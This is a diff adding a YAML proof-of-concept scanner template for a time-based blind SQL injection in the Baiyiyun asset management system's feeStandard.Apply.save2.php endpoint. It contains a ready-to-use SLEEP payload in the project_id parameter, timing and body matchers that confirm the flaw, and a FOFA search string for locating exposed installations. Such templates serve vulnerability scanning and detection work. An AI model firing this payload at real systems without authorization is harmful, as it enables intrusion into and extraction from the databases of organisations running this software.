@@ -1,0 +1,17 @@
+id: poc-yaml-baiyiyun-feestandard-apply-save2-php-sqli
+info:
+  name: 百易云资产管理运营系统 feeStandard.Apply.save2.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 百易云资产管理运营系统
+  fofa: body="不要着急，点此"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /adminx/feeStandard.Apply.save2.php?act=delete&id=1&project_id=1+AND+%28SELECT+11+FROM+%28SELECT%28SLEEP%28{{.t1}}%29%29%29BgSye%29--+-
+  expression: "status_code == 200 && \n!contains(body,\"<html\") &&\ncontains(body,\"\
+    操作失败. 无执行返回\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
